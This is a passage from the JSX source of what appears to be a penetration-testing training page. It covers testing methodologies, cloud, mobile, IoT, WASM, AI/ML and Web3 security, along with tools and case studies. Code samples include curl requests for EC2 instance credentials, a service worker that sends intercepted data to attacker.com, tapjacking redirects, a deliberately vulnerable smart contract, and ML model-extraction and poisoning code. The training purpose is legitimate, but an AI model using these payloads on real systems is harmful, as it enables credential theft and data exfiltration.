nmap -sV -p 80,443 example.com
whatweb https://example.com
httprint -h example.com -s signatures.txt

# WSTG-INFO-03: Metafiles Review
curl https://example.com/robots.txt
curl https://example.com/sitemap.xml
curl https://example.com/.well-known/security.txt
curl https://example.com/crossdomain.xml`}
                    title="OWASP Testing Examples"
                  />
                </div>
              </div>

              <Separator />

              <div>
                <h4 className="text-lg font-semibold mb-3">PTES (Penetration Testing Execution Standard)</h4>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div>
                    <h5 className="font-medium mb-2">Phase 1: Pre-engagement</h5>
                    <ul className="text-sm space-y-1 text-cybr-muted">
                      <li>• Scoping discussions</li>
                      <li>• Rules of engagement</li>
                      <li>• Timeline establishment</li>
                      <li>• Legal documentation</li>
                      <li>• Communication protocols</li>
                    </ul>
                  </div>
                  <div>
                    <h5 className="font-medium mb-2">Phase 2: Intelligence Gathering</h5>
                    <ul className="text-sm space-y-1 text-cybr-muted">
                      <li>• OSINT collection</li>
                      <li>• Footprinting techniques</li>
                      <li>• Social engineering prep</li>
                      <li>• Physical security assessment</li>
                      <li>• Target identification</li>
                    </ul>
                  </div>
                  <div>
                    <h5 className="font-medium mb-2">Phase 3: Threat Modeling</h5>
                    <ul className="text-sm space-y-1 text-cybr-muted">
                      <li>• Attack surface analysis</li>
                      <li>• Threat actor profiling</li>
                      <li>• Attack vector prioritization</li>
                      <li>• Business impact assessment</li>
                      <li>• Compliance requirements</li>
                    </ul>
                  </div>
                </div>
              </div>

              <Separator />

              <div>
                <h4 className="text-lg font-semibold mb-3">OSSTMM - Scientific Testing Approach</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-4">
                    <div>
                      <h5 className="font-medium mb-2">Security Analysis Framework</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• <strong>Porosity:</strong> System openness measurement</li>
                        <li>• <strong>Limitations:</strong> Security control boundaries</li>
                        <li>• <strong>Controls:</strong> Protective mechanisms analysis</li>
                        <li>• <strong>Trust:</strong> Relationship verification</li>
                        <li>• <strong>Visibility:</strong> Information exposure assessment</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-2">Testing Channels</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Human security testing</li>
                        <li>• Physical security assessment</li>
                        <li>• Wireless security evaluation</li>
                        <li>• Telecommunications testing</li>
                        <li>• Data networks analysis</li>
                      </ul>
                    </div>
                  </div>
                  <CodeExample
                    language="python"
                    code={`# OSSTMM Porosity Calculation
def calculate_porosity(open_ports, total_ports):
    """Calculate system porosity"""
    return (open_ports / total_ports) * 100

# Security Control Effectiveness
def control_effectiveness(attacks_blocked, total_attacks):
    """Measure security control effectiveness"""
    return (attacks_blocked / total_attacks) * 100

# Trust Verification Score
def trust_score(verified_components, total_components):
    """Calculate trust verification score"""
    return (verified_components / total_components) * 100

# Example Usage
porosity = calculate_porosity(25, 65535)  # 25 open ports
effectiveness = control_effectiveness(95, 100)  # 95% blocked
trust = trust_score(8, 10)  # 8/10 components verified

print(f"System Porosity: {porosity:.4f}%")
print(f"Control Effectiveness: {effectiveness}%")
print(f"Trust Score: {trust}%")`}
                    title="OSSTMM Metrics"
                  />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>Professional Reporting Standards</CardTitle>
              <CardDescription>Executive and technical reporting templates</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-4">
                  <div>
                    <h5 className="font-medium mb-2">Executive Summary Template</h5>
                    <ul className="text-sm space-y-1 text-cybr-muted">
                      <li>• Assessment overview and scope</li>
                      <li>• Key findings summary with risk ratings</li>
                      <li>• Business impact assessment</li>
                      <li>• Strategic recommendations timeline</li>
                      <li>• Compliance and regulatory implications</li>
                    </ul>
                  </div>
                  <div>
                    <h5 className="font-medium mb-2">Technical Finding Structure</h5>
                    <ul className="text-sm space-y-1 text-cybr-muted">
                      <li>• Vulnerability classification (OWASP/CWE)</li>
                      <li>• CVSS scoring and risk assessment</li>
                      <li>• Proof-of-concept demonstration</li>
                      <li>• Business impact analysis</li>
                      <li>• Detailed remediation guidance</li>
                    </ul>
                  </div>
                </div>
                <CodeExample
                  language="markdown"
                  code={`# Technical Finding Template

## [Vulnerability Name] - [Risk Level]

**Vulnerability Details:**
- Type: [OWASP Category/CWE]
- Affected Components: [Systems/Applications]
- CVSS Score: [Base score and vector]
- Discovery Method: [Manual/Automated]

**Description:**
[Detailed vulnerability explanation]

**Proof of Concept:**
[Step-by-step exploitation demonstration]

**Business Impact:**
- Confidentiality: [High/Medium/Low/None]
- Integrity: [High/Medium/Low/None]  
- Availability: [High/Medium/Low/None]

**Remediation:**
### Immediate Actions
[Quick fixes and workarounds]

### Long-term Solutions
[Comprehensive fixes]

**References:**
- [OWASP references]
- [CVE/CWE identifiers]`}
                  title="Report Template"
                />
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Cloud Security Testing */}
        <TabsContent value="cloud-security" className="mt-6 space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Cloud className="h-5 w-5" />
                AWS Security Assessment
              </CardTitle>
              <CardDescription>
                Comprehensive AWS web application security testing methodology
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <h4 className="text-lg font-semibold mb-3">AWS Service Discovery & Enumeration</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <CodeExample
                    language="bash"
                    code={`# S3 Bucket Enumeration
aws s3 ls s3://company-name
aws s3 ls s3://company-backup
aws s3 ls s3://company-logs
bucket_finder.rb wordlist.txt
slurp domain company.com

# CloudFront Distribution Discovery
aws cloudfront list-distributions
dig company.com
nslookup company.com

# EC2 Instance Metadata (SSRF)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/user-data/

# Lambda Function Discovery
aws lambda list-functions
aws lambda get-function --function-name function-name`}
                    title="AWS Reconnaissance"
                  />
                  <CodeExample
                    language="bash"
                    code={`# AWS Security Tools
# ScoutSuite - Multi-cloud auditing
pip install scoutsuite
scout aws --profile default

# Prowler - AWS security assessment
git clone https://github.com/prowler-cloud/prowler
./prowler aws

# Pacu - AWS exploitation framework
git clone https://github.com/RhinoSecurityLabs/pacu
python3 pacu.py

# S3Scanner - Bucket assessment
git clone https://github.com/sa7mon/S3Scanner
python s3scanner.py sites.txt

# Cloud_enum - Multi-cloud enumeration
python3 cloud_enum.py -k company`}
                    title="AWS Security Tools"
                  />
                </div>
              </div>

              <Separator />

              <div>
                <h4 className="text-lg font-semibold mb-3">Common AWS Web Application Misconfigurations</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-4">
                    <div>
                      <h5 className="font-medium mb-2">S3 Bucket Security Issues</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Public read/write permissions</li>
                        <li>• Bucket policy misconfigurations</li>
                        <li>• ACL bypass techniques</li>
                        <li>• Server-side encryption disabled</li>
                        <li>• Versioning and MFA delete disabled</li>
                        <li>• Logging and monitoring gaps</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-2">IAM Weaknesses</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Overprivileged policies</li>
                        <li>• Wildcard permissions (*)</li>
                        <li>• Cross-account trust issues</li>
                        <li>• Root account usage</li>
                        <li>• Access key exposure</li>
                        <li>• Weak password policies</li>
                      </ul>
                    </div>
                  </div>
                  <div className="space-y-4">
                    <div>
                      <h5 className="font-medium mb-2">API Gateway Security</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Unauthenticated endpoints</li>
                        <li>• CORS misconfigurations</li>
                        <li>• Rate limiting bypass</li>
                        <li>• Request/response manipulation</li>
                        <li>• Lambda authorization flaws</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-2">CloudFront Issues</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Cache poisoning vulnerabilities</li>
                        <li>• Origin server exposure</li>
                        <li>• Signed URL bypass</li>
                        <li>• Geographic restriction bypass</li>
                        <li>• Header injection attacks</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>Azure & GCP Security Testing</CardTitle>
              <CardDescription>Multi-cloud security assessment techniques</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <CodeExample
                  language="powershell"
                  code={`# Azure Security Assessment
# Azure AD Enumeration
Connect-AzureAD
Get-AzureADUser
Get-AzureADGroup
Get-AzureADApplication

# Storage Account Assessment
Get-AzStorageAccount
Get-AzStorageContainer
Get-AzStorageBlob

# Key Vault Enumeration
Get-AzKeyVault
Get-AzKeyVaultSecret
Get-AzKeyVaultKey

# ROADtools - Azure AD reconnaissance
pip install roadtools
roadrecon auth -u user@company.com -p password
roadrecon gather
roadrecon gui`}
                  title="Azure Security Testing"
                />
                <CodeExample
                  language="bash"
                  code={`# GCP Security Assessment
# Service Discovery
gcloud projects list
gcloud compute instances list
gcloud storage buckets list
gcloud sql instances list

# IAM Analysis
gcloud projects get-iam-policy project-id
gcloud iam service-accounts list
gcloud iam roles list

# Cloud Storage Assessment
gsutil ls gs://company-bucket
gsutil iam get gs://bucket-name
gsutil iam ch allUsers:objectViewer gs://bucket-name

# G-Scout - GCP security assessment
python g-scout.py`}
                  title="GCP Security Testing"
                />
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Mobile & IoT Security */}
        <TabsContent value="mobile-iot" className="mt-6 space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Smartphone className="h-5 w-5" />
                Mobile Web Application Security
              </CardTitle>
              <CardDescription>
                Mobile-specific web security testing methodologies
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <h4 className="text-lg font-semibold mb-3">Mobile-Specific Vulnerabilities</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-4">
                    <div>
                      <h5 className="font-medium mb-2">Touch Interface Exploitation</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Tap jacking attacks on mobile interfaces</li>
                        <li>• UI redressing specific to mobile browsers</li>
                        <li>• Gesture-based security bypasses</li>
                        <li>• Screen reader accessibility abuse</li>
                        <li>• Mobile keyboard input manipulation</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-2">Progressive Web App (PWA) Security</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Service worker exploitation techniques</li>
                        <li>• Web app manifest manipulation</li>
                        <li>• Offline functionality abuse</li>
                        <li>• Push notification hijacking</li>
                        <li>• Background sync manipulation</li>
                      </ul>
                    </div>
                  </div>
                  <CodeExample
                    language="javascript"
                    code={`// Mobile Browser Exploitation
// Tapjacking Example
document.addEventListener('touchstart', function(e) {
  // Capture touch events
  var touch = e.touches[0];
  var element = document.elementFromPoint(touch.clientX, touch.clientY);
  
  // Redirect sensitive actions
  if (element.id === 'delete-button') {
    window.location = 'https://attacker.com/phish';
  }
});

// Service Worker Manipulation
self.addEventListener('fetch', function(event) {
  if (event.request.url.includes('/api/sensitive')) {
    // Intercept and modify requests
    event.respondWith(
      fetch('https://attacker.com/steal-data', {
        method: 'POST',
        body: event.request.body
      })
    );
  }
});

// PWA Manifest Manipulation
{
  "name": "Legitimate App",
  "start_url": "https://attacker.com/phish",
  "display": "standalone",
  "icons": [...]
}`}
                    title="Mobile Exploitation Examples"
                  />
                </div>
              </div>

              <Separator />

              <div>
                <h4 className="text-lg font-semibold mb-3">WebView Security Testing</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <CodeExample
                    language="java"
                    code={`// Android WebView Vulnerabilities
// Insecure WebView Configuration
webView.getSettings().setJavaScriptEnabled(true);
webView.getSettings().setAllowFileAccess(true);
webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
webView.addJavascriptInterface(new WebAppInterface(this), "Android");

// JavaScript Interface Exploitation
<script>
Android.method("malicious_payload");
</script>

// File URI Exploitation
file:///android_asset/
file:///data/data/com.company.app/
content://`}
                    title="Android WebView"
                  />
                  <CodeExample
                    language="objc"
                    code={`// iOS WebView Security
// UIWebView (Deprecated but still found)
UIWebView *webView = [[UIWebView alloc] init];
[webView loadRequest:[NSURLRequest requestWithURL:
  [NSURL URLWithString:@"javascript:alert('XSS')"]]];

// WKWebView Security Configuration
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
WKUserContentController *controller = [[WKUserContentController alloc] init];
[controller addScriptMessageHandler:self name:@"bridge"];
config.userContentController = controller;

// JavaScript Bridge Exploitation
window.webkit.messageHandlers.bridge.postMessage({
  "action": "sensitive_operation",
  "payload": "malicious_data"
});`}
                    title="iOS WebView"
                  />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>IoT Web Interface Security</CardTitle>
              <CardDescription>Internet of Things web application security testing</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-4">
                  <div>
                    <h5 className="font-medium mb-2">IoT-Specific Attack Vectors</h5>
                    <ul className="text-sm space-y-1 text-cybr-muted">
                      <li>• Default credential exploitation</li>
                      <li>• Firmware extraction and analysis</li>
                      <li>• Communication protocol vulnerabilities</li>
                      <li>• Device management interface flaws</li>
                      <li>• Hardware attack surface assessment</li>
                    </ul>
                  </div>
                  <div>
                    <h5 className="font-medium mb-2">Hardware Security Testing</h5>
                    <ul className="text-sm space-y-1 text-cybr-muted">
                      <li>• UART/Serial interface discovery</li>
                      <li>• JTAG debug port exploitation</li>
                      <li>• SPI/I2C communication analysis</li>
                      <li>• Side-channel attack vectors</li>
                      <li>• Physical tampering detection bypass</li>
                    </ul>
                  </div>
                </div>
                <CodeExample
                  language="bash"
                  code={`# IoT Security Testing Tools
# Firmware Analysis Toolkit
git clone https://github.com/attify/firmware-analysis-toolkit
./fat.py firmware.bin

# Binwalk - Firmware extraction
binwalk -e firmware.bin
binwalk --signature firmware.bin

# Firmwalker - Firmware analysis
./firmwalker.sh /path/to/firmware

# EMBA - Embedded Analyzer
sudo ./emba.sh -l ~/firmware/firmware.bin

# Shodan CLI - IoT device discovery
shodan search "default password" --fields ip_str,port,org

# Hardware Interface Testing
# UART Communication
screen /dev/ttyUSB0 115200
minicom -D /dev/ttyUSB0 -b 115200

# SPI Flash Dump
flashrom -p linux_spi:dev=/dev/spidev0.0 -r firmware_dump.bin`}
                  title="IoT Testing Tools"
                />
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Advanced Research Topics */}
        <TabsContent value="advanced-research" className="mt-6 space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Brain className="h-5 w-5" />
                Cutting-Edge Security Research
              </CardTitle>
              <CardDescription>
                Latest security research topics and emerging threat vectors
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <h4 className="text-lg font-semibold mb-3">WebAssembly (WASM) Security</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-4">
                    <div>
                      <h5 className="font-medium mb-2">WASM Attack Vectors</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Memory corruption in WASM modules</li>
                        <li>• JavaScript-WASM bridge vulnerabilities</li>
                        <li>• Sandbox escape techniques</li>
                        <li>• Reverse engineering WASM binaries</li>
                        <li>• Side-channel attacks via WASM</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-2">WASM Analysis Tools</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• wabt - WebAssembly Binary Toolkit</li>
                        <li>• wasm2c - WASM to C converter</li>
                        <li>• wasm-decompile - Decompilation tool</li>
                        <li>• Ghidra WASM plugin</li>
                        <li>• Custom analysis frameworks</li>
                      </ul>
                    </div>
                  </div>
                  <CodeExample
                    language="javascript"
                    code={`// WASM Exploitation Techniques
// Memory corruption example
const wasmCode = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
  // ... WASM bytecode for memory manipulation
]);

const wasmModule = new WebAssembly.Module(wasmCode);
const wasmInstance = new WebAssembly.Instance(wasmModule);

// JavaScript-WASM bridge exploitation
const memory = new WebAssembly.Memory({initial: 10});
const view = new Uint8Array(memory.buffer);

// Manipulate WASM memory from JavaScript
view[0] = 0x41; // Potential buffer overflow
wasmInstance.exports.vulnerableFunction();

// WASM reverse engineering
const wasmBytes = await fetch('module.wasm').then(r => r.arrayBuffer());
const module = await WebAssembly.compile(wasmBytes);
const exports = WebAssembly.Module.exports(module);
console.log('Exported functions:', exports);`}
                    title="WASM Security Testing"
                  />
                </div>
              </div>

              <Separator />

              <div>
                <h4 className="text-lg font-semibold mb-3">AI/ML Security in Web Applications</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-4">
                    <div>
                      <h5 className="font-medium mb-2">AI/ML Attack Vectors</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Model poisoning attacks</li>
                        <li>• Adversarial input generation</li>
                        <li>• Model inversion attacks</li>
                        <li>• Membership inference attacks</li>
                        <li>• Model extraction techniques</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-2">Web-specific ML Vulnerabilities</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• Client-side model extraction</li>
                        <li>• API endpoint ML model abuse</li>
                        <li>• Training data injection via web forms</li>
                        <li>• ML-powered authentication bypass</li>
                        <li>• Recommendation system manipulation</li>
                      </ul>
                    </div>
                  </div>
                  <CodeExample
                    language="python"
                    code={`# AI/ML Security Testing
import numpy as np
import requests

# Adversarial Attack Example
def generate_adversarial_input(original_input, epsilon=0.1):
    """Generate adversarial input to fool ML model"""
    perturbation = np.random.uniform(-epsilon, epsilon, original_input.shape)
    adversarial_input = original_input + perturbation
    return np.clip(adversarial_input, 0, 1)

# Model Extraction Attack
def extract_model_via_api(api_endpoint, num_queries=1000):
    """Extract ML model behavior via API queries"""
    training_data = []
    
    for _ in range(num_queries):
        # Generate random input
        random_input = np.random.random((28, 28))  # Example image
        
        # Query the API
        response = requests.post(api_endpoint, 
                               json={'image': random_input.tolist()})
        prediction = response.json()['prediction']
        
        training_data.append((random_input, prediction))
    
    return training_data

# Model Poisoning via Web Form
poisoned_data = {
    'training_sample': malicious_input,
    'label': incorrect_label,
    'user_feedback': 'positive'  # Trick the system
}

requests.post('https://ml-app.com/feedback', json=poisoned_data)`}
                    title="AI/ML Security Testing"
                  />
                </div>
              </div>

              <Separator />

              <div>
                <h4 className="text-lg font-semibold mb-3">Blockchain & Web3 Security</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <CodeExample
                    language="solidity"
                    code={`// Smart Contract Vulnerabilities
pragma solidity ^0.8.0;

contract VulnerableContract {
    mapping(address => uint256) public balances;
    
    // Reentrancy vulnerability
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount);
        
        // Vulnerable: External call before state change
        (bool success,) = msg.sender.call{value: amount}("");
        require(success);
        
        balances[msg.sender] -= amount;  // State change after external call
    }
    
    // Integer overflow/underflow
    function unsafeAdd(uint256 a, uint256 b) public pure returns (uint256) {
        return a + b;  // No overflow protection
    }
    
    // Access control bypass
    address public owner;
    function onlyOwner() public {
        // Missing access control check
        // require(msg.sender == owner);
        selfdestruct(payable(msg.sender));
    }
}`}
                    title="Smart Contract Vulnerabilities"
                  />
                  <CodeExample
                    language="javascript"
                    code={`// Web3 Security Testing
const Web3 = require('web3');
const web3 = new Web3('http://localhost:8545');

// Smart contract interaction testing
async function testContractSecurity(contractAddress, abi) {
    const contract = new web3.eth.Contract(abi, contractAddress);
    
    // Test for reentrancy
    const attackContract = new web3.eth.Contract(attackAbi, attackAddress);
    await attackContract.methods.attack(contractAddress).send({from: attacker});
    
    // Test for overflow/underflow
    try {
        await contract.methods.unsafeAdd(
            '115792089237316195423570985008687907853269984665640564039457584007913129639935',
            '1'
        ).call();
    } catch (error) {
        console.log('Overflow protection detected');
    }
    
    // Test access controls
    const accounts = await web3.eth.getAccounts();
    for (let account of accounts) {
        try {
            await contract.methods.onlyOwner().send({from: account});
            console.log('Access control bypass found!');
        } catch (error) {
            console.log('Access control working for', account);
        }
    }
}

// DeFi protocol testing
async function testDefiProtocol(protocolAddress) {
    // Flash loan attack simulation
    // Price manipulation testing
    // Governance token exploitation
    // Liquidity pool manipulation
}`}
                    title="Web3 Security Testing"
                  />
                </div>
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Tools & Resources */}
        <TabsContent value="tools-resources" className="mt-6 space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Terminal className="h-5 w-5" />
                Professional Toolkit
              </CardTitle>
              <CardDescription>
                Comprehensive collection of advanced penetration testing tools and resources
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <h4 className="text-lg font-semibold mb-3">Commercial vs Open Source Tools</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-4">
                    <div>
                      <h5 className="font-medium mb-2">Commercial Solutions</h5>
                      <div className="space-y-2">
                        <div className="p-3 bg-cybr-muted/20 rounded">
                          <div className="flex justify-between items-center mb-1">
                            <span className="font-medium">Burp Suite Professional</span>
                            <Badge variant="outline">$399/year</Badge>
                          </div>
                          <p className="text-sm text-cybr-muted">Manual testing integration, extensive customization</p>
                        </div>
                        <div className="p-3 bg-cybr-muted/20 rounded">
                          <div className="flex justify-between items-center mb-1">
                            <span className="font-medium">Acunetix</span>
                            <Badge variant="outline">$4,500+/year</Badge>
                          </div>
                          <p className="text-sm text-cybr-muted">High accuracy, modern web app support</p>
                        </div>
                        <div className="p-3 bg-cybr-muted/20 rounded">
                          <div className="flex justify-between items-center mb-1">
                            <span className="font-medium">Nessus Professional</span>
                            <Badge variant="outline">$3,990/year</Badge>
                          </div>
                          <p className="text-sm text-cybr-muted">Comprehensive vulnerability database</p>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div className="space-y-4">
                    <div>
                      <h5 className="font-medium mb-2">Open Source Alternatives</h5>
                      <div className="space-y-2">
                        <div className="p-3 bg-cybr-muted/20 rounded">
                          <div className="flex justify-between items-center mb-1">
                            <span className="font-medium">OWASP ZAP</span>
                            <Badge variant="outline" className="bg-green-500/10 text-green-600 border-green-600/30">Free</Badge>
                          </div>
                          <p className="text-sm text-cybr-muted">Active development, CI/CD integration</p>
                        </div>
                        <div className="p-3 bg-cybr-muted/20 rounded">
                          <div className="flex justify-between items-center mb-1">
                            <span className="font-medium">Nuclei</span>
                            <Badge variant="outline" className="bg-green-500/10 text-green-600 border-green-600/30">Free</Badge>
                          </div>
                          <p className="text-sm text-cybr-muted">Template-based scanning, community-driven</p>
                        </div>
                        <div className="p-3 bg-cybr-muted/20 rounded">
                          <div className="flex justify-between items-center mb-1">
                            <span className="font-medium">Nikto</span>
                            <Badge variant="outline" className="bg-green-500/10 text-green-600 border-green-600/30">Free</Badge>
                          </div>
                          <p className="text-sm text-cybr-muted">Web server scanner, plugin system</p>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              <Separator />

              <div>
                <h4 className="text-lg font-semibold mb-3">Tool Integration & Automation</h4>
                <CodeExample
                  language="python"
                  code={`#!/usr/bin/env python3
"""
Advanced Web Penetration Testing Automation Framework
Integrates multiple tools for comprehensive assessment
"""

import subprocess
import json
import asyncio
import aiohttp
from pathlib import Path

class WebPentestFramework:
    def __init__(self, target, output_dir="results"):
        self.target = target
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
    async def run_reconnaissance(self):
        """Run comprehensive reconnaissance phase"""
        tasks = [
            self.subdomain_enumeration(),
            self.technology_detection(),
            self.content_discovery(),
            self.port_scanning()
        ]
        await asyncio.gather(*tasks)
    
    async def subdomain_enumeration(self):
        """Enumerate subdomains using multiple tools"""
        tools = [
            f"subfinder -d {self.target} -o {self.output_dir}/subdomains_subfinder.txt",
            f"amass enum -d {self.target} -o {self.output_dir}/subdomains_amass.txt",
            f"assetfinder {self.target} > {self.output_dir}/subdomains_assetfinder.txt"
        ]
        
        for tool in tools:
            process = await asyncio.create_subprocess_shell(
                tool, stdout=asyncio.subprocess.PIPE
            )
            await process.communicate()
    
    async def vulnerability_assessment(self):
        """Run vulnerability assessment phase"""
        await asyncio.gather(
            self.nuclei_scan(),
            self.nikto_scan(),
            self.custom_payloads()
        )
    
    async def nuclei_scan(self):
        """Run Nuclei template-based scanning"""
        cmd = f"nuclei -u https://{self.target} -t nuclei-templates/ -json -o {self.output_dir}/nuclei_results.json"
        process = await asyncio.create_subprocess_shell(cmd)
        await process.communicate()
    
    async def generate_report(self):
        """Generate comprehensive report"""
        results = {}
        
        # Aggregate results from all tools
        for result_file in self.output_dir.glob("*.json"):
            with open(result_file) as f:
                results[result_file.stem] = json.load(f)
        
        # Generate HTML report
        report_html = self.create_html_report(results)
        with open(self.output_dir / "report.html", "w") as f:
            f.write(report_html)
    
    def create_html_report(self, results):
        """Create professional HTML report"""
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Web Penetration Test Report - {self.target}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 40px; }}
                .header {{ background: #f0f0f0; padding: 20px; }}
                .finding {{ margin: 20px 0; padding: 15px; border-left: 4px solid #ff4444; }}
                .critical {{ border-color: #ff0000; }}
                .high {{ border-color: #ff8800; }}
                .medium {{ border-color: #ffaa00; }}
                .low {{ border-color: #00aa00; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Web Penetration Test Report</h1>
                <h2>Target: {self.target}</h2>
                <p>Generated: {datetime.now().isoformat()}</p>
            </div>
            <!-- Report content -->
        </body>
        </html>
        """

# Usage example
async def main():
    framework = WebPentestFramework("example.com")
    await framework.run_reconnaissance()
    await framework.vulnerability_assessment()
    await framework.generate_report()

if __name__ == "__main__":
    asyncio.run(main())`}
                  title="Automation Framework"
                />
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>Professional Development Resources</CardTitle>
              <CardDescription>Certification paths and learning resources for career advancement</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div>
                  <h5 className="font-medium mb-2">Entry-Level Certifications</h5>
                  <ul className="text-sm space-y-1 text-cybr-muted">
                    <li>• CompTIA Security+</li>
                    <li>• GIAC Security Essentials (GSEC)</li>
                    <li>• EC-Council Computer Hacking Forensic Investigator (CHFI)</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-medium mb-2">Intermediate Certifications</h5>
                  <ul className="text-sm space-y-1 text-cybr-muted">
                    <li>• Certified Ethical Hacker (CEH)</li>
                    <li>• GIAC Penetration Tester (GPEN)</li>
                    <li>• CompTIA PenTest+</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-medium mb-2">Advanced Certifications</h5>
                  <ul className="text-sm space-y-1 text-cybr-muted">
                    <li>• Offensive Security Certified Professional (OSCP)</li>
                    <li>• GIAC Expert-Level (GSE)</li>
                    <li>• GIAC Web Application Penetration Tester (GWEB)</li>
                  </ul>
                </div>
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Case Studies */}
        <TabsContent value="case-studies" className="mt-6 space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <FileSearch className="h-5 w-5" />
                Real-World Case Studies
              </CardTitle>
              <CardDescription>
                Detailed analysis of actual penetration testing engagements and lessons learned
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <h4 className="text-lg font-semibold mb-3">Case Study 1: E-commerce Platform Assessment</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-4">
                    <div>
                      <h5 className="font-medium mb-2">Engagement Overview</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• <strong>Target:</strong> Large e-commerce platform (500K+ users)</li>
                        <li>• <strong>Timeline:</strong> 3-week assessment</li>
                        <li>• <strong>Scope:</strong> Web application, mobile app, APIs</li>
                        <li>• <strong>Team:</strong> 3 senior penetration testers</li>
                        <li>• <strong>Methodology:</strong> OWASP Testing Guide + PTES</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-2">Key Findings</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• <span className="text-red-500">Critical:</span> SQL injection in payment processing</li>
                        <li>• <span className="text-orange-500">High:</span> Stored XSS in user reviews</li>
                        <li>• <span className="text-orange-500">High:</span> IDOR in order management</li>
                        <li>• <span className="text-yellow-500">Medium:</span> CSRF in account settings</li>
                        <li>• <span className="text-green-500">Low:</span> Information disclosure in headers</li>
                      </ul>
                    </div>
                  </div>
                  <div className="space-y-4">
                    <div>
                      <h5 className="font-medium mb-2">Business Impact</h5>
                      <ul className="text-sm space-y-1 text-cybr-muted">
                        <li>• <strong>Financial:</strong> Potential $2M+ in fraudulent transactions</li>
                        <li>• <strong>Reputation:</strong> Brand damage from data breach</li>
                        <li>• <strong>Compliance:</strong> PCI DSS violations identified</li>
                        <li>• <strong>Legal:</strong> GDPR compliance issues</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-2">Lessons Learned</h5>
